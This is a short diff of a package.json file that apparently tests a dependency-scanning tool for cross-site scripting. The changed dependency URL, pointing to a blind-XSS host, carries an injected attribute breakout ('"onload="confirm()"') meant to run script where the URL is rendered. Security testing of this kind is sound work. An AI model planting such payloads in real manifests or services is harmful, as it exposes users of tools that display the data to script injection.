@@ -9,6 +9,6 @@
   "author": "",
   "license": "ISC",
   "dependencies": {
-      "mydep": "git@bxss.r0l.me:/test<s>ds/snyknpmdep.git"
+      "mydep": "git@bxss.r0l.me:/test<s>ds\"onload=\"confirm()\"%20a=\"/snyknpmdep.git"
   }
 }
